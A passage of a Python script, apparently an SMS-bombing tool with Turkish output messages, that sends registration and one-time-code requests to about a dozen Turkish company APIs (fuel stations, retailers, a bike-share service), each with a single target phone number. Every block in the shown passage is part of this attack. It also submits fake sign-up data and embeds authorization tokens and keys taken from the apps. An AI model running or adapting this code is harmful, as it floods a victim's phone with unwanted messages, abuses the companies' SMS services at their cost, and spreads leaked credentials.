    json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": f"{random_mail}@gmail.com", "isUserAgreement": True, "name": "Memati", "password": "", "phone": phone, "productType": 1, "subscription": True, "surname": "Bas"}
    r = requests.post(url, json=json)
    if (r.json()["messageCode"]) == "OK":
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mogazmobilapinew.aygaz.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mogazmobilapinew.aygaz.com.tr")
        
        
#ipragaz.com.tr
try:
    r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={phone}&isRegistered=true")
    if (r.json()["data"]["success"]) == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> gomobilapp.ipragaz.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> gomobilapp.ipragaz.com.tr")
        

#petrolofisi.com.tr
try:
    url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
    headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Channel": "IOS", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{phone}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
    r = requests.post(url, headers=headers, json=json)
    if r.status_code == 204:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilapi.petrolofisi.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilapi.petrolofisi.com.tr")
        

#totalistasyonlari.com.tr
try:
    r = requests.post(f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={phone}&api_key=GetDocuments%0A", verify=False)
    if (r.json()["success"]) == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapi.totalistasyonlari.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.totalistasyonlari.com.tr")
        
        
#opet.com.tr
try:
    url = "https://api.opet.com.tr:443/api/authentication/register"
    json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": f"{random_mail}@gmail.com", "firstName": "Memati", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(phone), "opetKvkkAndEtk": True, "plate": "31ABC31"}
    r = requests.post(url, json=json)
    if (r.status_code) == 200:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.opet.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.opet.com.tr")
#dolap.com

try:
    url = "https://api-gateway.dolap.com:443/member"
    headers = {"Content-Type": "application/json", "Accept": "*/*", "Appversion": "359", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate", "Categorygroup": "WOMAN", "Access-Token": "", "User-Agent": "dolap/2 CFNetwork/1335.0.3 Darwin/21.6.0", "Appplatform": "ios"}
    json={"advertisingId": "", "campaignAgreement": False, "email": f"{random_mail}@gmail.com", "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": phone}
    r = requests.put(url, headers=headers, json=json)
    if r.status_code == 200:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api-gateway.dolap.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api-gateway.dolap.com")
        
#heymobility.tech
try:
    r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={phone}")
    if (r.json()["IsSuccess"]) == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> heyapi.heymobility.tech")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> heyapi.heymobility.tech")
        
#tazi.tech
try:
    url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
    json={"cep_tel": phone, "cep_tel_ulkekod": "90"}
    r = requests.post(url, headers=headers, json=json)
    if (r.json()["kod"]) == "0000":
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapiv2.tazi.tech")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapiv2.tazi.tech")
        

#isbike.istanbul
try:
    url = "http://app.isbike.istanbul:80/api/uye/otpsms"
    headers = {"Content-Type": "application/json", "Connection": "close", "Accept": "application/json", "User-Agent": "isbike/1.3.5 (tr.gov.ibb.isbikeNew; build:74; iOS 15.6.1) Alamofire/5.5.0", "Authorization": "Basic aXNiaWtlX3VzcjppX3NiaWtlMTQ/LSo1MyE=", "Accept-Encoding": "gzip, deflate", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9"}
    json={"cep_tel": phone, "cep_tel_ulkekod": 90, "tip": "MBL_UYE_LOGIN"}
    r = requests.post(url, headers=headers, json=json)
    if (r.json()["sonuc"]["aciklama"]) == "İşlem Başarılı":
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> app.isbike.istanbul")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> app.isbike.istanbul")
        

#n11.com
try:
    url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
    headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
    json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": F"{random_mail}@gmail.com", "gsmNumber": phone, "userType": "BUYER"}
    r = requests.post(url, headers=headers, json=json)
    if (r.json()["isSuccess"]) == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapi.n11.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.n11.com")
        

#joker.com.tr
try:
    url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
    data = {"phone": phone}
    r = requests.post(url, headers=headers, data=data)
    if (r.json()["success"]) == True:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> joker.com.tr")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> joker.com.tr")


#e-bebek.com
try:
    url = "https://api2.e-bebek.com:443/ebebekwebservices/v2/ebebek/users/anonymous/validate?curr=TRY&lang=tr"
    headers = {"Content-Type": "application/json", "Authorization": "Bearer rTeVaZRkRwHPdroX6JDN3uLtjRM"}
    json={"email": f"{random_mail}@gmail.com", "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": phone}
    r = requests.post(url, headers=headers, json=json)
    if r.json()["status"] == "SUCCESS":
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api2.e-bebek.com")
        
    else:
        raise
except:
    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api2.e-bebek.com")